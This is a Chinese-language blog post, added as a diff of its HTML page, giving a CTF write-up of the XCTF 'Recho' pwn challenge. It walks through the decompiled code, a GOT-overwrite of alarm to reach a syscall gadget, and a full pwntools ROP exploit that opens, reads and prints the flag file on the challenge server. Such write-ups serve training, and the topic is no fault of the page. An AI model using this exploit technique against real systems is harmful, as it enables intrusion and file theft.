@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    
+    <title>攻防世界——Recho - Hexo</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="攻防世界——Rechochecksec 123456789101112131415161718192021&#x2F;&#x2F; local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char nptr;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界——Recho">
+<meta property="og:url" content="https://wuxiankwy.github.io/2023/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="攻防世界——Rechochecksec 123456789101112131415161718192021&#x2F;&#x2F; local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char nptr;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-16T12:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-16T11:51:04.788Z">
+<meta property="article:author" content="WuXianKwY">
+<meta name="twitter:card" content="summary">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1697457136935">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1697457136935">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1697457136935">
+        
+    
+
+    
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+
+
+    <script async src="/js/app.js?v=1697457136935"></script>
+    
+     
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" 
+            style="background-image: url(https://s3.bmp.ovh/imgs/2023/07/29/c015f7b9d559ce0e.png)"
+        ></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="WuXianKwY" class="mdui-btn mdui-btn-icon"><img src="https://s3.bmp.ovh/imgs/2023/07/29/8245bd214a45fb15.png" alt="WuXianKwY"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="WuXianKwY">
+            <img src="https://s3.bmp.ovh/imgs/2023/07/29/8245bd214a45fb15.png" alt="WuXianKwY" alt="WuXianKwY">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>12</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY" title="我的朋友(正在制作)">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友(正在制作)
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+        
+            
+            <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+        
+            
+            <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=2t1ToHAIMLu3bpa3QHTu_xTwcD5Mylt3&authKey=aDskDr%2BGy5TIh5OsNTN2jp4SI%2BCmeqr5QFg5OGdXynAqh7RgDs3Q%2BO%2FgOnLdawyI&noverify=0&group_code=757442039"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/397860172"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/WuXianKwY/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+        
+            
+            
+
+        
+            
+            
+        
+            
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">12</span></li></ul>
+    </div>
+  </div>
+
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho/">攻防世界——Recho</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/21/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn/">每日一题——welpwn</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B/">每日一题——数据实时监测</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/14/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94ret2libc3%E7%BB%83%E4%B9%A0/">每日一题——ret2libc3练习</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/10/ret2libc3%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E5%B7%B2%E7%9F%A5%E5%87%BD%E6%95%B0%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE%E5%81%8F%E7%A7%BB/">利用已知函数的真实地址查找偏移</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+        
+            
+            <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://xiaoshu.app/" target="_blank" >
+                    <img src="https://s3.bmp.ovh/imgs/2023/08/15/9297586e75a1ce1f.jpg" alt="小舒同学"></img>
+                    <p>小舒同学</p>
+                </a>
+            </li>
+        
+            <li>
+                <a href="https://nexmoe.com/" target="_blank" >
+                    <img src="https://s3.bmp.ovh/imgs/2023/07/29/8245bd214a45fb15.png" alt="嘿！你好！"></img>
+                    <p>嘿！你好！</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+        
+    </aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 WuXianKwY
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">鄂ICP备2020018486号</a>
+<br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">
+<img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a>
+
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+    <div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://s3.bmp.ovh/imgs/2023/07/29/c015f7b9d559ce0e.png" alt="攻防世界——Recho" loading="lazy">
+            <h1>攻防世界——Recho</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年10月16日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="攻防世界——Recho"><a href="#攻防世界——Recho" class="headerlink" title="攻防世界——Recho"></a>攻防世界——Recho</h2><p>checksec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// local variable allocation has failed, the output may be wrong!</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [rsp+0h] [rbp-40h]</span><br><span class="line">  char buf[40]; // [rsp+10h] [rbp-30h]</span><br><span class="line">  int v6; // [rsp+38h] [rbp-8h]</span><br><span class="line">  int v7; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  Init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  write(1, &quot;Welcome to Recho server!\n&quot;, 0x19uLL);</span><br><span class="line">  while ( read(0, &amp;nptr, 0x10uLL) &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = atoi(&amp;nptr);</span><br><span class="line">    if ( v7 &lt;= 15 )</span><br><span class="line">      v7 = 16;</span><br><span class="line">    v6 = read(0, buf, v7);</span><br><span class="line">    buf[v6] = 0;</span><br><span class="line">    printf(&quot;%s&quot;, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码大意是读入一个数据的长度，再将数据存入buf数组。</p>
+<p>先进行数据长度的判断，若长度小于16，则将数据存入buf数组，并在末尾添加\0。</p>
+<p>string发现flag字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:00000000004003E9	0000000A	C	libc.so.6</span><br><span class="line">LOAD:00000000004003F3	00000006	C	stdin</span><br><span class="line">LOAD:00000000004003F9	00000007	C	printf</span><br><span class="line">LOAD:0000000000400400	00000005	C	read</span><br><span class="line">LOAD:0000000000400405	00000007	C	stdout</span><br><span class="line">LOAD:000000000040040C	00000007	C	stderr</span><br><span class="line">LOAD:0000000000400413	00000006	C	alarm</span><br><span class="line">LOAD:0000000000400419	00000005	C	atoi</span><br><span class="line">LOAD:000000000040041E	00000008	C	setvbuf</span><br><span class="line">LOAD:0000000000400426	00000012	C	__libc_start_main</span><br><span class="line">LOAD:0000000000400438	00000006	C	write</span><br><span class="line">LOAD:000000000040043E	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:000000000040044D	0000000C	C	GLIBC_2.2.5</span><br><span class="line">.rodata:00000000004008C4	0000001A	C	Welcome to Recho server!\n</span><br><span class="line">.eh_frame:0000000000400987	00000006	C	;*3$\&quot;</span><br><span class="line">.data:0000000000601058	00000005	C	flag</span><br></pre></td></tr></table></figure>
+
+<p>乍一看可以直接进行libc栈溢出，可是发现while条件中read（）无限满足条件循环，而构造system需要返回main进行两次溢出，所以放弃这种思路</p>
+<p>该怎么办呢？pwntools提供了一个shutdown()命令，可以跳出正在执行的循环，但是这也限制我们只能进行一次流程的溢出，而不能返回main进行二次sendline.</p>
+<p>正好发现函数中有alarm()函数，而alarm后0x5的地方是syscall，可以进行系统调用进行栈溢出，从而获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────</span><br><span class="line"> ► 0x7ffff7cea540 &lt;alarm&gt;       endbr64 </span><br><span class="line">   0x7ffff7cea544 &lt;alarm+4&gt;     mov    eax, 0x25</span><br><span class="line">   0x7ffff7cea549 &lt;alarm+9&gt;     syscall </span><br><span class="line">   0x7ffff7cea54b &lt;alarm+11&gt;    cmp    rax, -0xfff</span><br><span class="line">   0x7ffff7cea551 &lt;alarm+17&gt;    jae    alarm+20                &lt;alarm+20&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7cea553 &lt;alarm+19&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x7ffff7cea554 &lt;alarm+20&gt;    mov    rcx, qword ptr [rip + 0x12e8b5]</span><br><span class="line">   0x7ffff7cea55b &lt;alarm+27&gt;    neg    eax</span><br><span class="line">   0x7ffff7cea55d &lt;alarm+29&gt;    mov    dword ptr fs:[rcx], eax</span><br><span class="line">   0x7ffff7cea560 &lt;alarm+32&gt;    or     rax, 0xffffffffffffffff</span><br><span class="line">   0x7ffff7cea564 &lt;alarm+36&gt;    ret    </span><br></pre></td></tr></table></figure>
+
+<p>如何让alarm()的got表上的地址增加0x5呢？，在ida中可以找到这么一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040070D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040070D                 add     [rdi], al</span><br><span class="line">.text:000000000040070F                 retn</span><br><span class="line">.text:0000000000400710 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>意为给rdi中存入的地址增加al个字节，只需将al赋值为0x5，就可实现syscall系统调用</p>
+<p>一切准备就绪，接下来开始构造payload进行溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x38</span><br><span class="line">payload += p64(pop_rdi) + p64(alarm_got) + p64(pop_rax) + p64(0x5) + p64(rdi_al)</span><br><span class="line">#调用syscall</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(pop_rsi) + p64(0) + b&#x27;deadbeef&#x27; + p64(pop_rdi) + p64(flag_addr) + p64(pop_rax) + p64(0x2) +p64(alarm_addr)</span><br><span class="line">#调用fd = open(&#x27;flag&#x27;,READONLY)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(pop_rdx) + p64(0x50) + p64(pop_rsi) + p64(bss_addr+0x100) +b&#x27;deadbeef&#x27;+ p64(pop_rdi) +p64(3) + p64(read_addr)</span><br><span class="line">#调用read(0x50,bss_addr+0x100,3)</span><br><span class="line">#通常open打开的文件从第三个数据开始读写，前两个数据被占用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(pop_rdi) + p64(bss_addr+0x100) + p64(printf_addr)</span><br><span class="line">#调用printf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;61.147.171.105&quot;,64963)</span><br><span class="line">elf = ELF(&#x27;./recho&#x27;)</span><br><span class="line">pop_rax = 0x4006fc</span><br><span class="line">pop_rdi = 0x4008a3</span><br><span class="line">pop_rsi = 0x4008a1</span><br><span class="line">pop_rdx = 0x4006fe</span><br><span class="line">rdi_al = 0x40070D</span><br><span class="line">flag_addr = 0x601058</span><br><span class="line">bss_addr  =  0x601060</span><br><span class="line">read_addr  = elf.plt[&#x27;read&#x27;]</span><br><span class="line">printf_addr  = elf.plt[&#x27;printf&#x27;]</span><br><span class="line">alarm_addr = elf.plt[&#x27;alarm&#x27;]</span><br><span class="line">alarm_got = elf.got[&#x27;alarm&#x27;]</span><br><span class="line">payload = b&#x27;a&#x27;*0x38</span><br><span class="line">payload += p64(pop_rdi) + p64(alarm_got) + p64(pop_rax) + p64(0x5) + p64(rdi_al)</span><br><span class="line">payload += p64(pop_rsi) + p64(0) + b&#x27;deadbeef&#x27; + p64(pop_rdi) + p64(flag_addr) + p64(pop_rax) + p64(0x2) +p64(alarm_addr)</span><br><span class="line">payload += p64(pop_rdx) + p64(0x50) + p64(pop_rsi) + p64(bss_addr+0x100) +b&#x27;deadbeef&#x27;+ p64(pop_rdi) +p64(3) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi) + p64(bss_addr+0x100) + p64(printf_addr)</span><br><span class="line">payload = payload.ljust(0x200,b&#x27;\0&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(0x200))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.shutdown() </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于payload长度过长，可以使用ljust对齐来防止缓存异常，最后接收flag</p>
+
+    <p><img src="https://s3.bmp.ovh/imgs/2023/08/25/5d9bf97786040a97.jpg" loading="lazy"></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>WuXianKwY<br>
+        <strong>Link：</strong><a href="https://wuxiankwy.github.io/2023/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho/" title="https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;10&#x2F;16&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;wuxiankwy.github.io&#x2F;2023&#x2F;10&#x2F;16&#x2F;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho&#x2F;</a><br>
+        
+            <strong>内网映射搭建了个本机我的世界多模组服务器，暑假可以一起来玩ya
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1697457136916"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          扫码加入QQ群一起玩！
+
+      </div>
+  
+</div>
+</div>
+        <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho"><span class="toc-number">1.</span> <span class="toc-text">攻防世界——Recho</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
